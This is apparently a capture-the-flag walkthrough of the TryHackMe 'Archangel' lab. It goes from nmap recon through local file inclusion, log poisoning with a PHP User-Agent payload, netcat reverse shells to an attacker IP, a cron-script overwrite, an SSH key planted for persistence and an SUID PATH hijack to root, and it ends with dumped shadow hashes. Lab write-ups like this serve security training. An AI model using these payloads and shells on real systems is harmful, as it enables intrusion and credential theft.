# Recon

### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/Archangel/1-recon/nmap/nmap_init.md 10.10.93.86
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

### WEB

http://10.10.93.86/

![[web80.png]]

alternate DNS found

```
mafialive.thm
```

adding to /etc/hosts

```
10.10.93.86     mafialive.thm
```


http://mafialive.thm

![[dns80.png]]

```
thm{f0und_th3_r1ght_h0st_n4m3}
```


http://mafialive.thm/robots.txt


```
User-agent: *  
Disallow: /test.php
```

http://mafialive.thm/test.php

![[test.php.png]]

![[clickbutton.png]]

provides a new link in browser bar

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```


trying to view http://mafialive.thm/test.php?view=/etc/passwd

```
Sorry, Thats not allowed
```

this is the code of test.php web page

```
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="[/test.php?view=/var/www/html/development_testing/mrrobot.php](view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php)"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>
</body>
```

```
https://highon.coffee/blog/lfi-cheat-sheet/
```

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```


we see an archangel user

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../home/archangel/.ssh/id_rsa
```

did not work

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log
```

view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log

we are able to see log entries of our attempted urls

```
10.6.24.127 - - [24/Nov/2024:15:11:46 +0530] "GET / HTTP/1.1" 200 19498 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:11:49 +0530] "POST / HTTP/1.1" 200 19498 "http://10.10.93.86/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:11:50 +0530] "GET / HTTP/1.1" 200 19498 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:11:57 +0530] "GET /test.php?view=php://%3C?%20system(%27uname%20-a%27);?%3E HTTP/1.1" 200 538 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:12:00 +0530] "POST / HTTP/1.1" 200 19499 "http://10.10.93.86/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:12:13 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php?page=php://%3C?%20system(%27uname%20-a%27);?%3E HTTP/1.1" 200 514 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:16:41 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php?page=/usr/local/etc/apache24/httpd.conf HTTP/1.1" 200 514 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:16:56 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//../usr/local/etc/apache24/httpd.conf HTTP/1.1" 200 514 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:17:44 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 536 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.6.24.127 - - [24/Nov/2024:15:20:09 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log HTTP/1.1" 200 72218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

http://mafialive.thm/test.php

```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```

# Exploitation

https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/archangel/archangel.md

From the access logs it can be seen that along with the path that we are trying to access our User-Agent is also getting logged. We can add a PHP code in the User-Agent header using Burp Suite and with the help of that gain a reverse shell.

create a custom get request with variable *cmd* containing a command to run on the system

in the user agent of the get request, inset php code that will execute a function on the system with the value of the *cmd* variable from the input URL

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=whoami HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

![[lfipoc.png]]

now substituting that *whoami* command for a reverse shell

start a listener on the attacker machine

```
nc -lvnp 1337
```

https://www.revshells.com/

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f
```


url encode it

https://www.urlencoder.org/

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.6.24.127%201337%20%3E%2Ftmp%2Ff
```


new get request

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.6.24.127%201337%20%3E%2Ftmp%2Ff HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```


```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.93.86] 48340
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
$ 
```


upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

/home/archangel/user.txt

```
thm{lf1_t0_rc3_1s_tr1cky}
```


/etc/crontab

```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```

we can read and write as www-data

```
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```


start another listener on your attacker machine 

```
nc -lvnp 1338
```

command to edit helloworld.sh with a new reverse shell

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1338 >/tmp/f" > /opt/helloworld.sh
```

after about a minute, we get a hit

```
listening on [any] 1338 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.93.86] 57230
sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash");'
```

# Persistence

try ssh persistence

```
mkdir /home/archangel/.ssh
```

I had already generated an ssh key to use. now just add the public key to the archangel user.

```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCvzTzI1BzEXSTMwsCfzz/Pb8bldsBjY1yf2LdVvHVykRdNqEdsIuLECkxfqPpQKYI5YviSqgLFgogUJJyiIBtVkhhio2GbvhsQBJSFcG5cosRY87Ka2XYwRHKD/JDCaX7IBrzV1QbhM39w72raoPUbMkirf49ah6Vnk4dRMHxWmIH0okSSgRpGiewjz5y28wu8CY5ysEiARLkC8ROuGenNl4S1T4WnAaRF3hZURXwz0x5Q6ZWw0kZBSEsqQNaUpuNowYMkwXIb95ph6+1EaQxsdpETRX4fwGJqiHa1uNBn+l0ORfdEkT1K2EwzOCp+SNWfLrGWxZCnugh8SOAb7Iiz/EZwuZRXkq549ce2AboyK/ppadZUwTKTMJM2NHm1Ky7A9/hgE/voBdlWHsGtPDN7/bEvgCLZtUDrZMGqeEDmyU4h4cMND17JconsugcMAMVfMN4UladFLxSZq7qU01IrYfxreejx7pITgLru8+Kvb6cCQ7s7woAUQRrJmxyIv8vDs707pDy210ANjTgS1UUxKpwrZuXunfpmMKoUmzXxcW3DVi1d4+sSr7QL83cNRB5QbJ6OJTKA5xjmIjvAsxL8WMnQl5+C/01vkbkt57EEFN4s0Bs+WiMFxkhUMUcrIbX9yoie9aaFekpuhTFh7RtpT1u2ScDpjXEsN6qHikOnbQ== your_email@example.com" >> /home/archangel/.ssh/authorized_keys
```

```
ssh -i archangel_persis.rsa archangel@10.10.93.86
```

got ssh persistence

# Privilege Escalation

### User

/etc/crontab

```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```

we can read and write as www-data

```
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```


start another listener on your attacker machine 

```
nc -lvnp 1338
```

command to edit helloworld.sh with a new reverse shell

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1338 >/tmp/f" > /opt/helloworld.sh
```

after about a minute, we get a hit

```
listening on [any] 1338 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.93.86] 57230
sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash");'
```

### Root

however /home/archangel/secret/backup is an SUID file

```
-rwsr-xr-x 1 root root 16904 Nov 18  2020 /home/archangel/secret/backup
```

trying to run it

```
/home/archangel/secret/backup
```

```
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```

there is no /home/user directory... maybe we can take advantage of this

can't create a directory in home, maybe try changing the path for the *cp* file, we can make our own *cp* in a different directory

```
cd /dev/shm
touch cp
echo "/bin/bash -p" > cp
chmod 777 cp
export PATH=/dev/shm:$PATH
/home/archangel/secret/backup
```


we get a root shell

```
root@ubuntu:/dev/shm# whoami
root
root@ubuntu:/dev/shm# uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@ubuntu:/dev/shm# sudo -l
Matching Defaults entries for root on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ubuntu:
    (ALL : ALL) ALL
root@ubuntu:/dev/shm#
```

```
root:$6$oaCmOC4B$gxJbGzcO0DKU4bOJLa8W6pY3zId4XVtMuHz4PyWLvdpsCHs020OtE3zNSIMyOjPHyhb5A./Wm8Xv80OPsGreC.:18584:0:99999:7:::
daemon:*:18582:0:99999:7:::
bin:*:18582:0:99999:7:::
sys:*:18582:0:99999:7:::
sync:*:18582:0:99999:7:::
games:*:18582:0:99999:7:::
man:*:18582:0:99999:7:::
lp:*:18582:0:99999:7:::
mail:*:18582:0:99999:7:::
news:*:18582:0:99999:7:::
uucp:*:18582:0:99999:7:::
proxy:*:18582:0:99999:7:::
www-data:*:18582:0:99999:7:::
backup:*:18582:0:99999:7:::
list:*:18582:0:99999:7:::
irc:*:18582:0:99999:7:::
gnats:*:18582:0:99999:7:::
nobody:*:18582:0:99999:7:::
systemd-network:*:18582:0:99999:7:::
systemd-resolve:*:18582:0:99999:7:::
syslog:*:18582:0:99999:7:::
messagebus:*:18582:0:99999:7:::
_apt:*:18582:0:99999:7:::
uuidd:*:18582:0:99999:7:::
sshd:*:18582:0:99999:7:::
archangel:$6$erGNPDrB$7Oh1kiYT4ntVDWzpk8zAPPZGMxyGvoT.bFaYFr1fyCiiLd6xNFwgZpsvsPCk/qFJhr1ElpFn.bgSSlyA3R4LT/:18584:0:99999:7:::
```